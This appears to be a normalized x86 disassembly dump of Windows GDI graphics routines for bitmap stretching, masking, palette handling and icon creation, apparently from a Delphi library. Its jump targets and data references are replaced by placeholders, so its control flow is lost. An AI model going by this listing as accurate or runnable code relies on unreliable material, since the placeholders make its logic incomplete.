mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41ee60
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41ee94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f114
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41ecf0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f11b
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41ecf0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41ef67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4069e4
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f11b
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41f128
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41f160
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402ca4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41f1d8
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41f230
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028e0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f32d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f334
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41f348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41f3ce
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41f3e0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028e0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41f1d8
mov eax esp
call sub_41f348
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41f484
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41f1d8
mov [ esp ] eax
sub_41f4d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41ee80
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41ee60
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41f684
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41ecf0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f5aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41ed00
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5b1
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41ebf4
sub_41f5b1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41ee80
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41ecf0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f664
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41ed00
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f66b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41f6a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41f730
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b74
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41fa27
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41f819
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41ebf4
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f820
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f820
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41f694
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407b74
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41fa07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41f4d8
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407b74
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41f9e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9eb
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402704
retn
call sub_41ec48
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41f694
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41f6a0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41fa38
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41ebdc
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ca4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41ee80
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41fb1c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41fa38
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41fb88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41fa38
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fc25
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc2c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41fc5c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402ca4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402ca4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41fc50
xor edx edx
push ebp
push sub_41fe4a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41fb1c
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41fb1c
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41fe23
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407b74
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407b74
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407b74
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b74
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41fb88
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41fb88
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe2a
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402704
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402704
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402704
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402704
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
